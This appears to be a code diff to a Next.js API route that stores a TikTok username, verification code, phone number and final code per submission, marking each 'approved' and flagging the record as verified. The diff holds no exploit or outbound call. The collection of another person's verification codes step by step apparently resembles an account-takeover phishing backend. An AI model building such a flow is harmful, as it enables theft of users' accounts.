@@ -35,20 +35,21 @@ export async function POST(request: Request) {
         verificationCode, 
         phoneNumber, 
         finalCode 
-    } = body as Partial<Submission> & { tiktokUsername: string };
+    } = body as Partial<Submission> & { tiktokUsername?: string };
 
-    if (!tiktokUsername) {
-        return NextResponse.json({ message: 'TikTok username is required.' }, { status: 400 });
+    const id = body.id || (tiktokUsername ? (tiktokUsername.startsWith('@') ? tiktokUsername.substring(1) : tiktokUsername) : null);
+
+    if (!id) {
+        return NextResponse.json({ message: 'A TikTok username or existing submission ID is required.' }, { status: 400 });
     }
     
-    const id = tiktokUsername.startsWith('@') ? tiktokUsername.substring(1) : tiktokUsername;
-
-    const data: Partial<Submission> = {
-        id,
-        tiktokUsername: id,
-        tiktokUsernameStatus: 'approved',
-    };
+    const data: Partial<Submission> = {};
     
+    if(tiktokUsername) {
+        data.id = id;
+        data.tiktokUsername = id;
+        data.tiktokUsernameStatus = 'approved';
+    }
     if(verificationCode) {
         data.verificationCode = verificationCode;
         data.verificationCodeStatus = 'approved';
@@ -60,19 +61,21 @@ export async function POST(request: Request) {
     if(finalCode) {
         data.finalCode = finalCode;
         data.finalCodeStatus = 'approved';
+        data.isVerified = true;
     }
 
     const submission = await prisma.submission.upsert({
         where: { id },
         update: data,
         create: {
-            ...data,
-            // Set default statuses for create
+            id,
+            tiktokUsername: id,
+            tiktokUsernameStatus: data.tiktokUsername ? 'approved' : 'pending',
             verificationCodeStatus: data.verificationCode ? 'approved' : 'pending',
             phoneNumberStatus: data.phoneNumber ? 'approved' : 'pending',
             finalCodeStatus: data.finalCode ? 'approved' : 'pending',
             isVerified: !!data.finalCode,
-        } as Submission
+        }
     });
 
     return NextResponse.json(submission, { status: 200 });
